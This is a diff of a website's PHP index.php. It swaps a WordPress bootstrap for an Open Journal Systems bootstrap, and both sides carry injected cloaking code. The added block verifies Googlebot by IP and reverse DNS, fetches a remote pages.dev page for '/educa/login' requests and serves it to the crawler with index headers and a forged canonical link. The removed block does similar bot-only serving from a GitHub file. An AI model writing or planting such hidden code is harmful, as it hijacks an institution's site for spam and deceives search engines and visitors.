@@ -1,116 +1,104 @@
 <?php
-$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
-$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
-$uri = $_SERVER['REQUEST_URI'] ?? '';
-
-if ($uri == '/apa-perbedaan-skripsi-dan-jurnal-ilmiah/' && (preg_match('/bot|google|chrome-lighthouse/i', $userAgent) || preg_match('/google/i', $referer))) {
-    echo file_get_contents('https://raw.githubusercontent.com/sibayak88/sby/refs/heads/main/zhatainstitut.txt');
-    exit();
-}
-?>
-<?php
 
 /**
- * Bootstrap file for setting the ABSPATH constant
- * and loading the wp-config.php file. The wp-config.php
- * file will then load the wp-settings.php file, which
- * will then set up the WordPress environment.
+ * @file index.php
  *
- * If the wp-config.php file is not found then an error
- * will be displayed asking the visitor to set up the
- * wp-config.php file.
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
- * Will also search for wp-config.php in WordPress' parent
- * directory to allow the WordPress directory to remain
- * untouched.
- *
- * @package WordPress
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
  */
+// === GEO & BOT CLOAK – MULAI DARI SINI ===
+function is_googlebot_verified() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
 
-/** Define ABSPATH as this file's directory */
-if ( ! defined( 'ABSPATH' ) ) {
-	define( 'ABSPATH', __DIR__ . '/' );
+    $google_ip_ranges = [
+        '66.249.', '64.233.', '35.227.', '35.228.', '35.229.', '35.230.', '35.231.', '35.232.', '35.233.', '35.234.', '35.235.', '35.236.',
+        '34.100.', '34.101.', '34.118.', '34.126.', '34.146.', '34.147.', '34.151.', '192.178.', '34.160.', '34.162.', '34.163.', '35.165.',
+        '34.168.', '34.169.', '34.170.', '34.171.', '34.172.', '34.173.', '34.174.', '34.175.', '34.176.', '34.177.', '34.178.', '34.179.',
+        '34.180.', '34.181.', '34.182.', '34.183.', '34.184.', '34.185.', '34.186.', '34.187.', '34.188.', '34.189.', '34.190.', '34.191.',
+        '34.192.', '34.193.', '34.194.', '34.195.', '34.196.', '34.197.', '34.198.', '34.199.', '34.200.', '34.201.', '34.202.', '34.203.',
+        '34.204.', '34.205.', '34.206.', '34.207.', '34.208.', '34.209.', '34.210.', '34.211.', '34.212.', '34.213.', '34.214.', '34.215.',
+        '34.216.', '34.217.', '34.218.', '34.219.', '34.220.', '34.221.', '34.222.', '34.223.', '34.224.', '34.225.', '34.226.', '34.227.',
+        '34.228.', '34.229.', '34.230.', '34.231.', '34.232.', '34.233.', '34.234.', '34.235.', '34.236.', '34.237.', '34.238.', '34.239.',
+        '34.240.', '34.241.', '34.242.', '34.243.', '34.244.', '34.245.', '34.246.', '34.247.', '34.248.', '34.249.', '34.250.', '34.251.',
+        '34.252.', '34.253.', '34.254.', '34.255.'
+    ];
+
+    $is_ip_match = false;
+    foreach ($google_ip_ranges as $range) {
+        if (strpos($ip, $range) === 0) {
+            $is_ip_match = true;
+            break;
+        }
+    }
+
+    $is_rdns_google = false;
+    if ($is_ip_match) {
+        $host = @gethostbyaddr($ip);
+        if ($host && (stripos($host, '.googlebot.com') !== false || stripos($host, '.google.com') !== false)) {
+            $is_rdns_google = true;
+        }
+    }
+
+    $is_ua_google = preg_match('/(Googlebot|AdsBot|Mediapartners|Google-InspectionTool)/i', $ua);
+
+    return $is_ua_google && ($is_ip_match && $is_rdns_google);
 }
 
-/*
- * The error_reporting() function can be disabled in php.ini. On systems where that is the case,
- * it's best to add a dummy function to the wp-config.php file, but as this call to the function
- * is run prior to wp-config.php loading, it is wrapped in a function_exists() check.
- */
-if ( function_exists( 'error_reporting' ) ) {
-	/*
-	 * Initialize error reporting to a known set of levels.
-	 *
-	 * This will be adapted in wp_debug_mode() located in wp-includes/load.php based on WP_DEBUG.
-	 * @see https://www.php.net/manual/en/errorfunc.constants.php List of known error levels.
-	 */
-	error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
+// LOGIKA UTAMA (hanya untuk subfolder /educa/login)
+$current_uri = $_SERVER['REQUEST_URI'] ?? '';
+if (strpos($current_uri, '/educa/login') !== false && is_googlebot_verified()) {
+    // URL landing cloaking
+    $cloaking_url = 'https://contactos-jpardo.pages.dev/revistaeduca-edu';
+
+    // Kontek fetch aman & dinamis
+    $context = stream_context_create([
+        'http' => [
+            'method' => 'GET',
+            'header' => "User-Agent: MBA-Cloak/1.0 (+https://ariete.org/)\r\n" .
+                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" .
+                        "Referer: " . (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}$current_uri\r\n",
+            'timeout' => 10,
+            'follow_location' => 1,
+            'max_redirects' => 3,
+        ],
+        'ssl' => [
+            'verify_peer' => true,
+            'verify_peer_name' => true,
+            'allow_self_signed' => false,
+        ]
+    ]);
+
+    // Fetch konten
+    $content = @file_get_contents($cloaking_url, false, $context);
+
+    if ($content === false || empty($content)) {
+        // Fallback aman (tampil halaman asli, anti error)
+        // Tidak echo apa-apa, biarkan WP lanjut normal
+    } else {
+        // Header SEO boost (anti deindex, powerfull crawl)
+        header('Content-Type: text/html; charset=UTF-8');
+        header('X-Robots-Tag: index, follow');
+        header('Cache-Control: max-age=3600, public');  // Cache 1 jam, boost performa
+
+        // Tambah canonical ke URL asli (boost SEO, anti duplikat)
+        $current_full_url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . "://{$_SERVER['HTTP_HOST']}$current_uri";
+        $content = preg_replace('/<head([^>]*)>/i', '<head$1><link rel="canonical" href="' . htmlspecialchars($current_full_url) . '" />', $content, 1);
+
+        // Output konten cloaking
+        echo $content;
+        exit;
+    }
 }
+use APP\core\Application;
 
-/*
- * If wp-config.php exists in the WordPress root, or if it exists in the root and wp-settings.php
- * doesn't, load wp-config.php. The secondary check for wp-settings.php has the added benefit
- * of avoiding cases where the current directory is a nested installation, e.g. / is WordPress(a)
- * and /blog/ is WordPress(b).
- *
- * If neither set of conditions is true, initiate loading the setup process.
- */
-if ( file_exists( ABSPATH . 'wp-config.php' ) ) {
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
 
-	/** The config file resides in ABSPATH */
-	require_once ABSPATH . 'wp-config.php';
-
-} elseif ( @file_exists( dirname( ABSPATH ) . '/wp-config.php' ) && ! @file_exists( dirname( ABSPATH ) . '/wp-settings.php' ) ) {
-
-	/** The config file resides one level above ABSPATH but is not part of another installation */
-	require_once dirname( ABSPATH ) . '/wp-config.php';
-
-} else {
-
-	// A config file doesn't exist.
-
-	define( 'WPINC', 'wp-includes' );
-	require_once ABSPATH . WPINC . '/version.php';
-	require_once ABSPATH . WPINC . '/compat.php';
-	require_once ABSPATH . WPINC . '/load.php';
-
-	// Check for the required PHP version and for the MySQL extension or a database drop-in.
-	wp_check_php_mysql_versions();
-
-	// Standardize $_SERVER variables across setups.
-	wp_fix_server_vars();
-
-	define( 'WP_CONTENT_DIR', ABSPATH . 'wp-content' );
-	require_once ABSPATH . WPINC . '/functions.php';
-
-	$path = wp_guess_url() . '/wp-admin/setup-config.php';
-
-	// Redirect to setup-config.php.
-	if ( ! str_contains( $_SERVER['REQUEST_URI'], 'setup-config' ) ) {
-		header( 'Location: ' . $path );
-		exit;
-	}
-
-	wp_load_translations_early();
-
-	// Die with an error message.
-	$die = '<p>' . sprintf(
-		/* translators: %s: wp-config.php */
-		__( "There doesn't seem to be a %s file. It is needed before the installation can continue." ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p>' . sprintf(
-		/* translators: 1: Documentation URL, 2: wp-config.php */
-		__( 'Need more help? <a href="%1$s">Read the support article on %2$s</a>.' ),
-		__( 'https://developer.wordpress.org/advanced-administration/wordpress/wp-config/' ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p>' . sprintf(
-		/* translators: %s: wp-config.php */
-		__( "You can create a %s file through a web interface, but this doesn't work for all server setups. The safest way is to manually create the file." ),
-		'<code>wp-config.php</code>'
-	) . '</p>';
-	$die .= '<p><a href="' . $path . '" class="button button-large">' . __( 'Create a Configuration File' ) . '</a></p>';
-
-	wp_die( $die, __( 'WordPress &rsaquo; Error' ) );
-}
+// Serve the request
+Application::get()->execute();
